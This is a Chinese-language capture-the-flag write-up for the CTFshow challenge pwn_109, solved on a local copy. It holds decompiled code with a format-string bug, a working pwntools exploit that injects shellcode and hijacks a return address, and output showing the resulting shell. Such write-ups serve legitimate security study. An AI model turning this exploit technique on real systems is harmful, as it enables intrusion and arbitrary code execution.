# CTFshow-pwn_109
1. 题目来源：CTFshow题库（本地环境）
2. PWN + 整数安全（整数溢出 + 栈溢出）
## 解题思路
> PIE + 格式化字符串修改指定地址数据 + shellcode 注入  
> 没想明白这题为啥在整数安全里

仅开启 PIE
```text
(forpwn) mrw@mrw-VMware-Virtual-Platform:~/CTFshow$ checksec ./pwn_109
[*] '/home/mrw/CTFshow/pwn_109'
    Arch:       i386-32-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        PIE enabled
    Stack:      Executable
    RWX:        Has RWX segments
```

> 部分函数经过重命名  

程序在主函数中进行选择，可以进行输入与输出

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [esp+0h] [ebp-40Ch] BYREF
  char buf[1024]; // [esp+4h] [ebp-408h] BYREF
  int *p_argc; // [esp+404h] [ebp-8h]

  p_argc = &argc;
  sub_73B();
  sub_7A2();
  while ( 1 )
  {
    while ( 1 )
    {
      puts("What you want to do?\n1) Input someing!\n2) Hang out!!\n3) Quit!!!");
      __isoc99_scanf("%d", &v4);
      getchar();
      if ( v4 != 2 )
        break;
      fmt_vuln(buf);
    }
    if ( v4 == 3 )
      break;
    if ( v4 == 1 )
      leak_and_input(buf, 0x400u);
    else
      printf("What do you mean by %d", v4);
  }
  puts("See you~");
  return 0;
}
```
`leak_and_input` 先泄露地址再输入  
```c
ssize_t __cdecl leak_and_input(void *buf, size_t nbytes)
{
  printf("%x\n", buf);
  return read(0, buf, nbytes);
}
```

`fmt_vuln` 直接触发格式化字符串漏洞  
```c
int __cdecl fmt_vuln(char *format)
{
  return printf(format);
}
```

程序未开启栈上的 NX 保护，且泄露 buf 地址，可以注入 shellcode。  
格式化字符串触发时对应的位置为 `16$`，且 `fmt_vuln` 的返回地址在栈上的偏移为 `buf - 0x24`  
可以注入 shellcode 并用格式化字符串劫持到 shellcode 完成提权  

**exp 如下**  
```python
from pwn import *
context(arch = 'i386')
p = process('./pwn_109')
gdb.attach(p)
p.sendlineafter(b'Quit!!!\n', b'1')
buf_addr = int(p.recvuntil(b'\n')[:-1] , 16)
# print(f'{buf_addr:x}')
# print(fmtstr_payload(16, {buf_addr+0x24:buf_addr+0x100}))
sc = asm(shellcraft.sh())
payload = fmtstr_payload(16, {buf_addr-0x24:buf_addr+0x100}).ljust(0x100, b'\x00') + sc
p.send(payload)
p.sendlineafter(b'Quit!!!\n', b'2')
p.interactive()
```

## Flag
> 题目在本地运行， flag自己随便设的
运行结果如下
```text
(forpwn) mrw@mrw-VMware-Virtual-Platform:~/CTFshow$ python3 ./exp/pwn_109.py
[+] Starting local process './pwn_109': pid 25843
[*] running in new terminal: ['/usr/bin/gdb', '-q', './pwn_109', '-p', '25843']
[+] Waiting for debugger: Done
[*] Switching to interactive mode
                                                                                                               \xcc                            T                                                                                                          \xf0      \xf0aaaL\xf7\x8d\xffN\xf7\x8d\xffM\xf7\x8d\xffO\xf7\x8d\xff$  
$ ls /
bin		   dev	 lib.usr-is-merged  media  run		       swap.img
bin.usr-is-merged  etc	 lib32		    mnt    sbin		       sys
boot		   flag  lib64		    opt    sbin.usr-is-merged  tmp
cdrom		   home  libx32		    proc   snap		       usr
ctfshow_flag	   lib	 lost+found	    root   srv		       var
$ cat /ctfshow_flag
flag{Success!}
$  
```